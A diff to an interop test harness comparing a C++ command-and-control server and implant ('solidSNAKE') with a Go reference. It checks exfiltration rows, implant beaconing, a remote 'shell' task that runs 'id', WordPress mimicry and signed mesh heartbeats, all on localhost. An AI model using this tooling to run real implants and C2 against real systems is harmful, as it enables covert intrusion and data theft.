@@ -767,4 +767,213 @@ try:
     for name, wd in (("go", "go"), ("snake", "snake")):
         with sqlite3.connect(os.path.join(work, wd, "data", "c2.db")) as db:
             rows[name] = db.execute(
-                "SELECT implant_id, data_type, data, channel FROM exfil_data").
+                "SELECT implant_id, data_type, data, channel FROM exfil_data").fetchall()
+    if rows["go"] != rows["snake"] or not rows["go"]:
+        print("  FAIL exfil rows: go=%r snake=%r" % (rows["go"], rows["snake"]))
+        fails += 1
+
+    snake_imp = os.path.join(root, "build/solidsnake")
+    for port in (gport, cport):
+        p = subprocess.run([snake_imp, "--c2", "wss://127.0.0.1:%d/ws" % port, "--key", KEY,
+                            "--insecure", "--once", "--id", IMPID],
+                           stdout=silent, stderr=subprocess.STDOUT, timeout=60)
+        if p.returncode != 0:
+            print("  FAIL ws beacon (port %d) rc=%d" % (port, p.returncode))
+            fails += 1
+    cmp_case("ws-registered implant row", "GET", "/api/dashboard/implants", headers=gtok)
+    cmp_case("ws implant detail", "GET", "/api/dashboard/implant/" + IMPID, headers=gtok)
+    cmp_case("config with implant", "GET", "/api/dashboard/config", headers=gtok)
+
+    s, b, _ = req(cport, "POST", "/api/dashboard/task",
+                  '{"implant_id":"%s","type":"shell","payload":{"command":"id"}}' % IMPID, ctok)
+    if s != 200:
+        print("  FAIL snake task queue: %s %r" % (s, b))
+        fails += 1
+    subprocess.run([snake_imp, "--c2", "wss://127.0.0.1:%d/ws" % cport, "--key", KEY,
+                    "--insecure", "--once", "--id", IMPID],
+                   stdout=silent, stderr=subprocess.STDOUT, timeout=60)
+    with sqlite3.connect(os.path.join(work, "snake", "data", "c2.db")) as db:
+        st, result = db.execute("SELECT status, result FROM tasks WHERE implant_id=?",
+                                (IMPID,)).fetchone()
+        beacons = db.execute("SELECT beacon_count FROM implants WHERE id=?", (IMPID,)).fetchone()[0]
+    if st != "completed" or "uid=" not in (result or ""):
+        print("  FAIL snake ws task cycle: status=%r result=%r" % (st, result))
+        fails += 1
+    if beacons != 2:
+        print("  FAIL snake beacon count: %r" % (beacons,))
+        fails += 1
+finally:
+    for pid_attr in ("gpid", "cpid"):
+        pid = locals().get(pid_attr)
+        if pid:
+            pid.send_signal(signal.SIGTERM)
+            try:
+                pid.wait(5)
+            except subprocess.TimeoutExpired:
+                pid.kill()
+
+if fails:
+    sys.exit(1)
+print("    C2 API: request matrix value-identical on both servers (routes, status codes, "
+      "bodies, auth redirects/JWT, AEAD envelope rejection, payload serving, WordPress "
+      "mimicry), byte-identical dashboard asset, DNS exfil rows, WS register parity and a full "
+      "solidSNAKE WS task cycle (beacon -> task -> result) in the solidSNAKE store")
+PYEOF
+
+echo "[*] go+cc: mesh node parity (gob codec, signed heartbeats, live TLS peers)..."
+mkdir -p "$MOD/cmd/meshref"
+cp "$ROOT/harness/mesh_ref.go" "$MOD/cmd/meshref/main.go"
+
+MESHTMP=$(mktemp -d /tmp/snake-mesh-XXXXXX)
+(cd "$MOD" && go run ./cmd/meshref gob-gen) > "$MESHTMP/gob_go.txt"
+(cd "$ROOT" && make -s build/test_mesh)
+(cd "$ROOT" && ./build/test_mesh --gob-dump) > "$MESHTMP/gob_snake.txt"
+(cd "$MOD" && go run ./cmd/meshref gob-check "$MESHTMP/gob_snake.txt") > "$MESHTMP/gob_snake_by_go.txt"
+(cd "$ROOT" && ./build/test_mesh --gob-decode "$MESHTMP/gob_go.txt") > "$MESHTMP/gob_go_by_snake.txt"
+(cd "$ROOT" && ./build/test_mesh --sig-dump) > "$MESHTMP/sig_snake.txt"
+
+python3 - "$MESHTMP" "$ROOT" "$MOD" <<'PYEOF'
+import json, os, subprocess, sys, time
+
+tmp, root, mod = sys.argv[1], sys.argv[2], sys.argv[3]
+fails = 0
+
+
+def rows(path):
+    out = []
+    for line in open(path):
+        line = line.rstrip("\n")
+        if not line:
+            continue
+        h, j = line.split("\t")
+        out.append((h, json.dumps(json.loads(j), sort_keys=True)))
+    return out
+
+
+go = rows(os.path.join(tmp, "gob_go.txt"))
+snake = rows(os.path.join(tmp, "gob_snake.txt"))
+if [h for h, _ in go] != [h for h, _ in snake]:
+    print("  FAIL mesh gob: encoded bytes differ from Go")
+    fails += 1
+if [j for _, j in go] != [j for _, j in snake]:
+    print("  FAIL mesh gob: fixture values differ from Go")
+    fails += 1
+
+back = [json.dumps(json.loads(l), sort_keys=True) for l in open(os.path.join(tmp, "gob_snake_by_go.txt")) if l.strip()]
+if back != [j for _, j in snake]:
+    print("  FAIL mesh gob: Go decoded the solidSNAKE stream to different values")
+    fails += 1
+fwd = [json.dumps(json.loads(l), sort_keys=True) for l in open(os.path.join(tmp, "gob_go_by_snake.txt")) if l.strip()]
+if fwd != [j for _, j in go]:
+    print("  FAIL mesh gob: solidSNAKE decoded the Go stream to different values")
+    fails += 1
+
+sig = subprocess.run(["go", "run", "./cmd/meshref", "sig-check", os.path.join(tmp, "sig_snake.txt")],
+                     cwd=mod, capture_output=True, text=True)
+if sig.returncode != 0 or "sig ok" not in sig.stdout:
+    print("  FAIL mesh signature: Go rejected a solidSNAKE-signed heartbeat: %r %r" % (sig.stdout, sig.stderr))
+    fails += 1
+
+
+def events(path):
+    out = []
+    for line in open(path):
+        line = line.strip()
+        if not line.startswith("{"):
+            continue
+        e = json.loads(line)
+        e.pop("addr", None)
+        if e.get("event") == "listen":
+            continue
+        out.append(json.dumps(e, sort_keys=True))
+    return sorted(out)
+
+
+def run_leg(snake_listens, snake_id, go_id):
+    global fails
+    snakeout = os.path.join(tmp, "leg_snake_%s.json" % snake_id)
+    goout = os.path.join(tmp, "leg_go_%s.json" % go_id)
+    if snake_listens:
+        snake = subprocess.Popen([os.path.join(root, "build/test_mesh"), "--peer", "--id", snake_id,
+                               "--listen", "127.0.0.1:0", "--interval-ms", "400", "--sign", "1",
+                               "--seconds", "8"], stdout=open(snakeout, "w"), stderr=subprocess.DEVNULL)
+        port = None
+        for _ in range(200):
+            if os.path.exists(snakeout):
+                for line in open(snakeout):
+                    if '"listen"' in line:
+                        port = json.loads(line)["port"]
+                        break
+            if port:
+                break
+            time.sleep(0.05)
+        if not port:
+            print("  FAIL mesh: solidSNAKE peer never reported its listen port")
+            fails += 1
+            snake.kill()
+            return
+        go = subprocess.run(["go", "run", "./cmd/meshref", "peer", "--id", go_id,
+                             "--listen", "127.0.0.1:0", "--bootstrap", "127.0.0.1:%d" % port,
+                             "--seconds", "3"], cwd=mod, capture_output=True, text=True, timeout=180)
+        open(goout, "w").write(go.stdout)
+        snake.wait(30)
+    else:
+        go = subprocess.Popen(["go", "run", "./cmd/meshref", "peer", "--id", go_id,
+                               "--listen", "127.0.0.1:0", "--seconds", "8"], cwd=mod,
+                              stdout=open(goout, "w"), stderr=subprocess.DEVNULL)
+        port = None
+        for _ in range(600):
+            if os.path.exists(goout):
+                for line in open(goout):
+                    if '"listen"' in line:
+                        port = json.loads(line)["port"]
+                        break
+            if port:
+                break
+            time.sleep(0.05)
+        if not port:
+            print("  FAIL mesh: Go peer never reported its listen port")
+            fails += 1
+            go.kill()
+            return
+        subprocess.run([os.path.join(root, "build/test_mesh"), "--peer", "--id", snake_id,
+                        "--listen", "127.0.0.1:0", "--bootstrap", "127.0.0.1:%d" % port,
+                        "--interval-ms", "400", "--sign", "1", "--seconds", "3"],
+                       stdout=open(snakeout, "w"), stderr=subprocess.DEVNULL, timeout=180)
+        go.terminate()
+        try:
+            go.wait(10)
+        except subprocess.TimeoutExpired:
+            go.kill()
+
+    snakee, goe = events(snakeout), events(goout)
+    want_snake = json.dumps({"event": "join", "id": go_id, "implants": 0, "version": "3.0"},
+                         sort_keys=True)
+    want_go = json.dumps({"event": "join", "id": snake_id, "implants": 0, "version": "3.0"},
+                         sort_keys=True)
+    tag = "snake-listen" if snake_listens else "go-listen"
+    if want_snake not in snakee:
+        print("  FAIL mesh(%s): solidSNAKE did not see the Go peer join: %r" % (tag, snakee))
+        fails += 1
+    if want_go not in goe:
+        print("  FAIL mesh(%s): Go did not see the solidSNAKE peer join: %r" % (tag, goe))
+        fails += 1
+    hb = [e for e in goe if json.loads(e).get("event") == "heartbeat"]
+    if not any(json.loads(e).get("node_id") == snake_id for e in hb):
+        print("  FAIL mesh(%s): Go saw no solidSNAKE heartbeat: %r" % (tag, goe))
+        fails += 1
+
+
+run_leg(True, "c2-snake-mesh-a", "c2-go-mesh-b")
+run_leg(False, "c2-snake-mesh-c", "c2-go-mesh-d")
+
+if fails:
+    sys.exit(1)
+print("    mesh: gob heartbeat stream byte-identical to Go's encoding/gob and decodable in both "
+      "directions (incl. every prefix split), solidSNAKE Ed25519 heartbeats verified by Go's ed25519, and "
+      "live mutual-TLS peer legs both ways (peer id from the certificate CN, heartbeats received "
+      "on both sides)")
+PYEOF
+rm -rf "$MESHTMP"
+
+echo "[OK] bidirectional Go<->C++ interop is green (crypto + protocol + dns + cli + payloads + store + c2 + c2-api + mesh)"
